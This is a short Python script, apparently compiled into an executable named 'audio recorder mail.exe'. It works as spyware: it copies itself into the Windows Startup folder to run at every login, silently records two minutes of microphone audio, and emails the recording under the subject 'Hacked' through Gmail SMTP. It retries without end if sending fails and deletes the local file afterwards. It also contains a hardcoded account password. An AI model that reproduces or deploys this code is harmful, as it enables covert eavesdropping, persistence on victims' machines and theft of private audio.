from shutil import copyfile
import os, time

try:
    copyfile('audio recorder mail.exe',
            'C://Users' + f'//{os.getlogin()}' + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//audio recorder mail.exe')
except:
    pass

import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv

freq = 44100
duration = 120

filename = 'C://Users' + f'//{os.getlogin()}' + '//Documents//recording.mp3'
recording = sd.rec(int(duration * freq),
                samplerate=freq, channels=2)

sd.wait()
wv.write(filename, recording, freq, sampwidth=2)

# https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4NCqPzrmYABGDvDXRZ2otRGTMvD3g1gchNo0HTKiGEIr3HlCp-RFNAtMwvDEpYACPiCBp2ggt9X5ztsf1LUR5dVhW6nag

def hacked():
    try:

        import smtplib
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders

        fromaddr = "sagar.sws2000@gmail.com"
        toaddr = ["hellovickykumar123@gmail.com", fromaddr][1]

        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr

        msg['Subject'] = "Hacked"
        link = 'https://github.com/imvickykumar999/Screen-Recorder'
        body = f'''
        This E-Mail is Sent using python code using {link},
        '''
        msg.attach(MIMEText(body, 'plain'))
        attachment = open(filename, "rb")

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        try:
            s.login(fromaddr, "Sagarsws2000@")
        except Exception as e:
            print(e)

        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        # print('mailed')
        s.quit()

    except Exception as e:
        time.sleep(2)
        # print(e)
        hacked()

hacked()
os.remove(filename)
